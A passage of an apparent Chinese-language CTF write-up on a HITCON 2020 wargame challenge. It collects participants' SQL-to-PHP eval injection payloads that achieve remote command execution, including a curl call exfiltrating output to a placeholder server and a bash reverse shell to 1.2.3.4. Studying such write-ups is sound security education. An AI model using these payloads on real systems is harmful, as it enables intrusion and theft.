&lt;p&gt;這個解法利用了 MySQL 一個相容性的特性，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{identifier expr}&lt;/code&gt; 是 ODBC Escape 語法，MySQL 相容了這個語法，使得在語句中出現時不會導致語法錯誤，因此我們可以構造出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru &apos;/readflag&apos;} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt; 字串仍然會是合法的 SQL 語句，更進一步地嘗試將 ODBC Escape 中的空白移除改以括號包夾字串的話，會變成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt;，由於 MySQL 提供的語法彈性，此段語句仍然會被視為合法並且可正常執行得到相同結果。&lt;/p&gt;

&lt;p&gt;接著再看進到 eval 前會構造出這樣的 PHP 語句：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)}&lt;/code&gt;，由於 PHP 在語法上也提供了極大的彈性，使得我們可以利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$object-&amp;gt;{ expr }&lt;/code&gt; 這樣的語法將 expr 敘述句動態執行完的結果作為物件屬性名稱去存取物件的屬性，因此結果就會呼叫 passthru 函式執行系統指令。&lt;/p&gt;

&lt;p&gt;這邊補充一個冷知識，當想到系統指令時，大家直覺可能會想到使用 system 函式，但是 MySQL 在 8.0.3 中將 system 加入關鍵字保留字之中，而這題目環境是使用 MySQL 8.0 架設的，所以如果使用 system 的話反而會失敗唷！&lt;/p&gt;

&lt;h2 id=&quot;來自會眾朋友們的解法&quot;&gt;來自會眾朋友們的解法&lt;/h2&gt;

&lt;p&gt;由於朋友們踴躍提交的解法眾多，所以我們將各解法簡單做了分組，另外提醒一下，以下順序只是提交的先後時間差，並無任何優劣，能取得 flag 的解法都是好解法！接下來就讓我們進行介紹吧。&lt;/p&gt;

&lt;h3 id=&quot;odbc-escape&quot;&gt;ODBC Escape&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;by Mico (https://www.facebook.com/MicoDer/):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;amp;id=1

SQL: SELECT {exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個解法與出題者的十分類似，但沒有使用可以直接輸出結果的 passthru 而是改用 exec，接著透過 curl 把結果回傳至自己的伺服器，據本人說法是因為「覺得駭客就該傳些什麼回來自己Server XD 」XD。&lt;/p&gt;

&lt;h3 id=&quot;comment-everywhere&quot;&gt;Comment Everywhere&lt;/h3&gt;

&lt;p&gt;幾乎所有程式語言都有註解符號可以讓開發人員在程式碼中間加上文字說明，以便下一個開發人員接手時可以快速理解這段程式碼的意義。當然 SQL 與 PHP 也有各自的註解符號，但它們所支援的符號表示稍微有些差異，而這小差異就可以幫助我們達成目的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by LJP (https://ljp-tw.github.io/blog/)&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%0a-- /*%0a-- */ ; system(&apos;/readflag&apos;);%0a&amp;amp;id=1

SQL: SELECT id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     FROM mytable WHERE id = &apos;1&apos;
PHP: $output = id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個解法看似複雜，本質上其實很單純，就是利用兩個語言支援不同註解符號的特性。對於 SQL 而言，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 是註解符號，會無視後方所有到換行為止的文字，所以每一行以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 開頭的字串，SQL 是看不見的。接著來看 PHP，對於 PHP 而言，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* 任何字串 */&lt;/code&gt; 這是註解的表示方式，開頭結尾由 / 與 * 組成，中間被包夾的字串是看不見的，並且支援換行，而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 在 PHP 之中則代表遞減運算子，所以如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output --&lt;/code&gt; 字串其實是在對 $output 進行減 1 的操作。綜合上面特性，對於上面的解法，其實只有 PHP 看見的第三行 ` ; system(‘/readflag’);` 會認為是需要執行的程式碼，其餘部分不論是 SQL 還是 PHP 都以為是註解的字串而無視，因此可以順利執行取得 flag。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;amp;id=1

SQL: SELECT name /*! from mytable */ -- ; system(&quot;/readflag&quot;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name /*! from mytable */ -- ; system(&quot;/readflag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此解法也是同樣運用註解，但使用的註解符號似乎稍微特殊，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* */&lt;/code&gt; 除了 PHP 之外，MySQL 也同樣支援此允許多行的註解符號，但假如多上一個驚嘆號 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt;，事情就又稍微不同了，這是 MySQL 特有的變種註解符號，在此符號中的字串，仍然會被 MySQL 當成 SQL 的一部分執行，但在其他 DBMS 之中，因為是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*&lt;/code&gt; 開頭就會認為它就是單純的註解文字而忽視，讓開發人員能撰寫可 portable 的程式碼。因此就能製造出一串註解文字可被 MySQL 看見但無法被 PHP 看見，強制在註解文字裡讓 SQL 構造合法語句，再利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 註解閉合所有冗贅 SQL 語句，緊接著 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 後就能撰寫任意 PHP 執行碼。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by FI:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&amp;gt;&amp;amp;id=1

SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同樣是利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 註解符號強行構造合法查詢，不過有趣的是，MySQL 支援 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; 單行的註解符號，此註解符號同樣也被 PHP 支援，所以不會導致 PHP 語法錯誤，最後還多了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&amp;gt;&lt;/code&gt; 強行結束 PHP 程式區塊，冷知識是如果程式碼是 PHP 程式區塊內最後一行的話，不加 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; 並不會導致語法錯誤唷 :P&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by tree:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null--+.$output=exec(&apos;/readflag&apos;)&amp;amp;id=

SQL: SELECT null-- .$output=exec(&apos;/readflag&apos;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- .$output=exec(&apos;/readflag&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也是用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 把 PHP 程式碼的部分在 SQL 裡面遮蔽起來，利用了 null 關鍵字讓 SQL 查詢有回傳結果，但在 PHP 之中卻變成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;null&lt;/code&gt; 對 $row 物件存取名為 null 的屬性，使得 PHP 也能合法執行，最後將指令執行結果覆蓋 $output 變數，讓題目幫助我們輸出結果。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cebrusfs (https://www.facebook.com/menghuan.yu):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;amp;id=1

SQL: SELECT column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;)) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此解法也是類似的思路，運用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 閉合再湊出合法 PHP 程式碼，最後直接使用 var_dump 強制輸出 exec 的執行結果。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Jason3e7 (https://github.com/jason3e7):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;-- $id %2b system(&apos;/readflag&apos;);%23&amp;amp;id=1

SQL: SELECT NULL;-- $id + system(&apos;/readflag&apos;);# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;NULL;-- $id + system(&apos;/readflag&apos;);#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這也是相似的思路，有趣的是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; 這個部分，大家一定記得 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$id --&lt;/code&gt; 是遞減運算子，但有時可能會忘記 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; 也同樣是遞減運算子，所以這個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 會使得 MySQL 認為是註解，PHP 卻仍認為是遞減運算子並正常執行下去。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shoui:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;&amp;amp;id=1

SQL: SELECT null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同樣運用註解 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; 閉合 SQL 但 PHP 又是遞減運算子的特性，而 system 又會將指令執行結果直接輸出，因此就能直接取得 flag。本人有補充說明當時測試時直接複製貼上原始碼那行接測試，後來使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&amp;amp;column=null-- -&quot;1&quot;;&quot; &quot;.system(&apos;/readflag&apos;).&quot;;&quot;&lt;/code&gt; 精簡後的 payload XD。&lt;/p&gt;

&lt;h3 id=&quot;double-quoted-string-evaluation&quot;&gt;Double-quoted String Evaluation&lt;/h3&gt;

&lt;p&gt;PHP 會自動在由雙引號「”」包夾的字串中，尋找 $ 開頭的字詞，將其解析成變數再把值代入字串中，這個功能對於快速輸出已充分跳脫處理的變數值非常有幫助，可以增加程式碼可讀性；但同樣地，我們也可以利用這個功能做一下有趣的事情，例如這段 PHP 程式碼 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${phpinfo()}&quot;;&lt;/code&gt; 就可以直接執行 phpinfo 函式，利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${system(&apos;id&apos;)}&quot;;&lt;/code&gt; 就可以執行系統指令；而在 MySQL 中，雙引號「”」恰好也可以被用來表示純字串，所以我們就能構造出「MySQL 認為是純字串，PHP 卻認為需要解析執行」的 Payload。&lt;/p&gt;

&lt;p&gt;讓我們先來看第一個例子：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ginoah:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=&quot;${system(&apos;/readflag&apos;)}&quot;&amp;amp;id=1

SQL: SELECT id=&quot;${system(&apos;/readflag&apos;)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id=&quot;${system(&apos;/readflag&apos;)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;對於 SQL 而言，就是回傳 id 與字串比較的結果；但對於 PHP 而言，上述結果是將雙引號字串解析完後才賦值給變數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;id&lt;/code&gt;，而結果就如同前面說的，它會執行系統指令 /readflag，還會將結果輸出至網頁，所以就能取得 flag！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Billy (https://github.com/st424204):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%2b&quot;{$_POST[1]($_POST[2])}&quot;&amp;amp;id=1
POST: 1=system&amp;amp;2=/readflag

SQL: SELECT name+&quot;{$_POST[1]($_POST[2])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name+&quot;{$_POST[1]($_POST[2])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同樣利用雙引號特性，但這個例子構造的較為複雜，利用了一些鬆軟特性，在 PHP 中，若字串變數是一個存在的函式的名稱，則我們可以利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$func = &apos;system&apos;; $func(&apos;id&apos;);&lt;/code&gt; 這樣的方式來呼叫該變數，這個例子就是應用了這個特性，將我們從前端傳遞過去的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[1]&lt;/code&gt; 當成函式名稱、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[2]&lt;/code&gt; 作為函式的參數執行，因此只要參數再帶上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=system&amp;amp;2=readflag&lt;/code&gt; 就能取得 flag！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Hans (https://hans00.me)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;&amp;amp;id=1
POST: fn=system&amp;amp;cmd=/readflag

SQL: SELECT id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個例子與前一個利用了同樣的特性，差別在與此處的 Payload 改用 OR 邏輯運算子 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;||&lt;/code&gt;，而前面使用的是加法算術運算子 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt;，但結果都是相同的。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Chris Lin (https://github.com/kulisu)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=TRUE/&quot;${system(%27/readflag%27)}&quot;;%23&amp;amp;id=1

SQL: SELECT TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這也是用相同概念，前面改用除法算術運算子 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;。看完解法才發現投稿者是同事！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201030/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;execution-operator&quot;&gt;Execution Operator&lt;/h3&gt;

&lt;p&gt;在 PHP 中存在眾多函式可以執行系統指令，其中還包括一個特殊的 &lt;a href=&quot;https://www.php.net/manual/en/language.operators.execution.php&quot;&gt;Execution Operator&lt;/a&gt;，此運算子的形式是利用反引號「&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt;」將字串包夾起來，這樣該字串就會被當作系統指令執行，其內部實際是執行 shell_exec，更貼心的事情是，這個運算子同樣支援 Double-quoted String Evaluation，所以若是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$cmd = &apos;id&apos;; echo `$cmd`;&lt;/code&gt; 這樣的形式，PHP 就會先解析 $cmd 得出 id，再執行 id 系統指令；而在 MySQL 之中，反引號是用來表示一個 identifier，identifier 用來指示一個物件，最常見的是資料表或是資料欄，當我們執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT c FROM t&lt;/code&gt;，其中 c 和 t 就是 identifier，所以若想靠 Execution Operator 來執行指令，可能還必須同時讓 identifier 能夠被 MySQL 識別才行。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by dalun (https://www.nisra.net):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=`$_POST[1]`%23?&amp;gt;&amp;amp;id=%0a+from+(select+&apos;id&apos;,&apos;$_POST[1]&apos;)+as+a+--+
POST: 1=/readflag

SQL: SELECT id=`$_POST[1]`#?&amp;gt; FROM mytable WHERE id = &apos;
     from (select &apos;id&apos;,&apos;$_POST[1]&apos;) as a -- &apos;
PHP: $output = $row-&amp;gt;id=`$_POST[1]`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個解法似乎是唯一願意使用 id 參數的 XD！在 column 參數用註解符號 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; 閉合後續，在 id 參數插入換行符號並構造一個合法的 SQL，透過子查詢製造合法的 identifier，最後由 PHP 透過 execution operator 執行系統指令。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by HexRabbit (https://twitter.com/h3xr4bb1t):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name+or+@`bash+-c+&quot;bash+-i+&amp;gt;%26+/dev/tcp/1.2.3.4/80+0&amp;gt;%261&quot;`&amp;amp;id=1

SQL: SELECT name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;` FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;`;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個解法核心也是透過 execution oeperator 執行指令，不過用了一個特殊的字元 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;。在 MySQL 中，這代表 user-defined variables，後面的字串則為變數的名稱，而且名稱可以使用特殊字元，只要使用 identifier 的符號 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; 把字串包夾起來即可，而存取不存在的變數並不會導致錯誤，MySQL 只會回傳 NULL 的結果。在 PHP 中的話，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; 代表 &lt;a href=&quot;https://www.php.net/language.operators.errorcontrol&quot;&gt;error control operator&lt;/a&gt;，可以放置在表達式前，會讓 PHP 將此表達式執行產生的錯誤訊息全部忽略，由於是表達式，所以也能附加在 execution operator 之前。最後這個解法再用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;or&lt;/code&gt; 邏輯運算子（MySQL 與 PHP 皆支援並且意義相同）串接即可達成執行系統指令。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cjiso1117 (https://twitter.com/cjiso)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;%23&amp;amp;id=qwe

SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;# FROM mytable WHERE id = &apos;qwe&apos;
PHP: $output = $row-&amp;gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同樣是利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 製造出 PHP 看不見、MySQL 看得見的註解文字來控制資料庫查詢結果，最後利用 execution operator 來達成執行系統指令，但由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; 內的文字會被 MySQL 認為是 identifier，找不到對應資源會導致錯誤，所以透過子查詢和 alias 語法強行製造出 identifier 讓查詢正確執行。&lt;del&gt;本人表示一開始覺得用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; 會很帥，結果走偏繞了一大圈&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shik (https://github.com/ShikChen/)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%2b&quot;${print_r(`/readflag`)}&quot;&amp;amp;id=1

SQL: SELECT id+&quot;${print_r(`/readflag`)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${print_r(`/readflag`)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這個解法利用加法運算子組合 id identifier 和雙引號字串，接著在雙引號字串利用 evaluation 特性執行 PHP 程式碼，透過 execution operator 執行系統指令後再以 print_r 強制輸出結果，取得 flag。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;匿名:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: id=1&amp;amp;column=id%2b&quot;${`yes`}&quot;

SQL: SELECT id+&quot;${`yes`}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${`yes`}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;另外還收到一個匿名提交的解法，思路與前面相同，總之就也附上來了～。&lt;/p&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;以上就是我們這次為 HITCON 2020 準備的 Wargame 的其中一道開放式題目的分享和大家的解法介紹，不知道各位喜不喜歡呢？&lt;del&gt;喜歡的話記得訂閱、按讚、分享以及開啟小鈴鐺唷！&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;題外話，這次我們總共有 5 道 100 分題目，是領取小獎品的基本條件，但我們還準備了 3 道僅有 1 分的 bonus 題目，類型是 2 個 web 與 1 個唯一的 pwn，讓大家能進一步挑戰進階實戰能力，而這次有解開至少一道 bonus 題的為以下兩位參加者：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;11/14 Balsn CTF 2020 總獎金十萬元: 502 分&lt;/li&gt;
  &lt;li&gt;FI: 501&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;友情工商：由台灣知名 CTF 戰隊之一的 Balsn 舉辦的 Balsn CTF 2020 將在 11/14 舉辦，他們準備了豐富的比賽獎金與充滿創意、技術性的題目，想證明實力的朋友們可不要錯過了！&lt;/p&gt;

&lt;p&gt;Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090
Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/&lt;/p&gt;

&lt;p&gt;另外的另外，最後讓我們恭喜 &lt;strong&gt;yuawn (https://twitter.com/_yuawn)&lt;/strong&gt; 以 1 分之姿榮獲 &lt;strong&gt;DEVCORE Wargame 最後 1 名&lt;/strong&gt;！全場排行榜上唯一得分不超過 100 的參加者，同時他也取得了 pwn 題目的首殺兼唯一解，恭喜他 👏👏。&lt;/p&gt;

&lt;p&gt;最後附上今年的前十名，就讓我們 2021 年再見囉～&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Place&lt;/th&gt;
      &lt;th&gt;Team&lt;/th&gt;
      &lt;th&gt;Score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;11/14 Balsn CTF 2020 總獎金十萬元&lt;/td&gt;
      &lt;td&gt;502&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;FI&lt;/td&gt;
      &lt;td&gt;501&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;mico&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;ankleboy&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;hans00&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Meow&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
